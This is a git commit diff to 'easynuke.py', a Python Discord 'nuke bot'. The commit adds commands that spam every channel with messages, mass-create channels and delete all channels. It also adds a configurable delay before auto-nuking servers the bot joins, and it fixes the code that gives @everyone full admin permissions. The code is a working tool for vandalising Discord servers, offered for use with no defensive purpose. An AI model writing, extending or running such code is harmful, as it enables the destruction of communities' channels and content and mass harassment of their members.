44380a66315c5e409a78a94035767bf5a4f63596
Chatic Gaming <68609002+Chatic-Gaming@users.noreply.github.com>
2020-08-17 11:01:24 -0400

    Update easynuke.py
    added sall, cdel and ccr commands

--- easynuke.py
+++ easynuke.py
@@ -7,12 +7,16 @@ spam_messages = ["@everyone nuked", "@everyone get nuked"]
 channel_names = ["nuked", "get nuked"]
 webhook_usernames = ["nuked", "get nuked"]
 nuke_on_join = False
+nuke_wait_time = 0
+
+
 
 ###############################################################################################################################
 # WAIT!!! DON'T TOUCH ANYTHING BELOW UNLESS YOU KNOW EXACTLY WHAT YOU ARE DOING!!! THIS MAY CAUSE SOME ISSUES WITH THE BOT!!! #
 ###############################################################################################################################
 
-import discord, random, aiohttp
+
+import discord, random, aiohttp, asyncio
 from discord import Webhook, AsyncWebhookAdapter
 from discord.ext import commands
 from discord.ext.commands import *
@@ -24,19 +28,6 @@ bot = commands.Bot(command_prefix = prefix)
 @bot.event
 async def on_ready():
   print(f"""
-{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}   ▄████████    ▄████████    ▄████████ ▄██   ▄   ███▄▄▄▄   ███    █▄     ▄█   ▄█▄    ▄████████ {S.RESET_ALL}||
-{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}  ███    ███   ███    ███   ███    ███ ███   ██▄ ███▀▀▀██▄ ███    ███   ███ ▄███▀   ███    ███ {S.RESET_ALL}||
-{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}  ███    █▀    ███    ███   ███    █▀  ███▄▄▄███ ███   ███ ███    ███   ███▐██▀     ███    █▀  {S.RESET_ALL}||
-{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT} ▄███▄▄▄       ███    ███   ███        ▀▀▀▀▀▀███ ███   ███ ███    ███  ▄█████▀     ▄███▄▄▄     {S.RESET_ALL}||
-{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}▀▀███▀▀▀     ▀███████████ ▀███████████ ▄██   ███ ███   ███ ███    ███ ▀▀█████▄    ▀▀███▀▀▀     {S.RESET_ALL}||
-{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}  ███    █▄    ███    ███          ███ ███   ███ ███   ███ ███    ███   ███▐██▄     ███    █▄  {S.RESET_ALL}||
-{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}  ███    ███   ███    ███    ▄█    ███ ███   ███ ███   ███ ███    ███   ███ ▀███▄   ███    ███ {S.RESET_ALL}||
-{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}  ██████████   ███    █▀   ▄████████▀   ▀█████▀   ▀█   █▀  ████████▀    ███   ▀█▀   ██████████ {S.RESET_ALL}||
-
-{S.RESET_ALL}                                       -Made by Chaotic-
-                       https://github.com/Chatic-Gaming/DiscordNukebot
-
-
 {S.BRIGHT}{C.LIGHTGREEN_EX}Easynuke is ready.{S.NORMAL}
 This script is connected to {C.WHITE}{bot.user}.
 {C.GREEN}Run {C.WHITE}{prefix}kill {C.GREEN}in any server to nuke it.
@@ -59,7 +50,16 @@ Shows this message.
  
 {prefix}kill
 Nukes the server. 
-
+ 
+{prefix}sall <message>
+Spams all the channels.
+ 
+{prefix}ccr <channel count> <channel name>
+Creates channels with the given name.
+ 
+{prefix}cdel
+Deletes all channels.
+ 
 {prefix}logout
 Logs out the client.
 ```
@@ -76,7 +76,7 @@ async def nuke(guild):
   print(f"{C.WHITE}Nuking {guild.name}.")
   role = discord.utils.get(guild.roles, name = "@everyone")
   try:
-    await role.edit(permissions = Permissions.all())
+    await role.edit(permissions = discord.Permissions.all())
     print(f"{C.GREEN}Successfully granted admin permissions in {C.WHITE}{guild.name}")
   except:
     print(f"{C.RED}Admin permissions NOT GRANTED in {C.WHITE}{guild.name}")
@@ -105,10 +105,61 @@ async def kill(ctx):
 @bot.event
 async def on_guild_join(guild):
   if nuke_on_join == True:
+    await asyncio.sleep(nuke_wait_time)
     await nuke(guild)
   else:
     return
   
+@bot.command()
+async def sall(ctx, *, message = None):
+  if message == None:
+    for channel in ctx.guild.channels:
+      try:
+        await channel.send(random.choice(spam_messages))
+      except discord.Forbidden:
+        print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
+        return
+      except:
+        pass
+  else:
+    for channel in ctx.guild.channels:
+      try:
+        await channel.send(message)
+      except discord.Forbidden:
+        print(f"{C.RED}Sall Error {C.WHITE}[Cannot send messages]")
+        return
+      except:
+        pass
+
+@bot.command()
+async def ccr(ctx, amount = 10, *, name = None):
+  if name == None:
+    for i in range(amount):
+      try:
+        await ctx.guild.create_text_channel(random.choice(channel_names))
+      except discord.Forbidden:
+        print(f"{C.RED}Ccr Error {C.WHITE}[Cannot create channel]")
+        return
+      except:
+        pass
+  else:
+    for i in range(amount):
+      try:
+        await ctx.guild.create_text_channel(name)
+      except discord.Forbidden:
+        print(f"{C.RED}Ccr Error {C.WHITE}[Cannot create channel]")
+        return
+      except:
+        pass
+
+@bot.command()
+async def cdel(ctx):
+  for channel in ctx.guild.channels:
+    try:
+      await channel.delete()
+      print(f"{C.GREEN}Successfully deleted channel {C.WHITE}{channel.name}")
+    except:
+      print(f"{C.RED}Channel {C.WHITE}{channel.name} {C.RED}has NOT been deleted.")
 
 @bot.event
 async def on_guild_channel_create(channel):
@@ -124,9 +175,23 @@ async def logout(ctx):
   await ctx.message.delete()
   exit()
 
-try:
-  bot.run(token)
-except discord.LoginFailure:
-  print(f"{C.RED}Client failed to log in. {C.WHITE}[Improper Token Passed]")
-except discord.HTTPException:
-  print(f"{C.RED}Client failed to log in. {C.WHITE}[Unknown Error]")
+if __name__ == "__main__":
+  print(f"""
+{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}   ▄████████    ▄████████    ▄████████ ▄██   ▄   ███▄▄▄▄   ███    █▄     ▄█   ▄█▄    ▄████████ {S.RESET_ALL}||
+{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}  ███    ███   ███    ███   ███    ███ ███   ██▄ ███▀▀▀██▄ ███    ███   ███ ▄███▀   ███    ███ {S.RESET_ALL}||
+{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}  ███    █▀    ███    ███   ███    █▀  ███▄▄▄███ ███   ███ ███    ███   ███▐██▀     ███    █▀  {S.RESET_ALL}||
+{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT} ▄███▄▄▄       ███    ███   ███        ▀▀▀▀▀▀███ ███   ███ ███    ███  ▄█████▀     ▄███▄▄▄     {S.RESET_ALL}||
+{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}▀▀███▀▀▀     ▀███████████ ▀███████████ ▄██   ███ ███   ███ ███    ███ ▀▀█████▄    ▀▀███▀▀▀     {S.RESET_ALL}||
+{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}  ███    █▄    ███    ███          ███ ███   ███ ███   ███ ███    ███   ███▐██▄     ███    █▄  {S.RESET_ALL}||
+{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}  ███    ███   ███    ███    ▄█    ███ ███   ███ ███   ███ ███    ███   ███ ▀███▄   ███    ███ {S.RESET_ALL}||
+{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}  ██████████   ███    █▀   ▄████████▀   ▀█████▀   ▀█   █▀  ████████▀    ███   ▀█▀   ██████████ {S.RESET_ALL}||
+
+{S.RESET_ALL}                                       {C.BLACK}-Made by Chaotic-
+                       {C.WHITE}https://github.com/Chatic-Gaming/DiscordNukebot
+  """)
+  try:
+    bot.run(token)
+  except discord.LoginFailure:
+    print(f"{C.RED}Client failed to log in. {C.WHITE}[Improper Token Passed]")
+  except discord.HTTPException:
+    print(f"{C.RED}Client failed to log in. {C.WHITE}[Unknown Error]")
